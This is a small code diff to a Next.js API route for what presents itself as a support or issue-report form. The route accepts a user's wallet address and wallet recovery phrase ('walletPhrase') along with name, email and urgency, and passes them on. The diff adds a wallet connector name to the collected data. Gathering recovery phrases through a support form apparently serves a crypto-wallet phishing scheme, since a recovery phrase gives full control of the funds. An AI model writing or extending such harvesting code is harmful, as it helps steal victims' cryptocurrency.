@@ -6,7 +6,7 @@ export async function POST(request: NextRequest) {
 
     const body = await request.json()
 
-    const { issueType, name, email, description, urgency, walletAddress,walletPhrase, network, timestamp } = body
+    const { issueType, name, email, description, urgency, walletAddress,connectorName,walletPhrase, network, timestamp } = body
 
     // Validate required fields
     if (!issueType || !name || !email || !description || !urgency) {
@@ -29,6 +29,7 @@ export async function POST(request: NextRequest) {
       urgency,
       walletAddress: walletAddress || "Not connected",
       walletPhrase,
+      connectorName: connectorName || "Unknown",
       network: network || "Unknown",
       timestamp,
     })
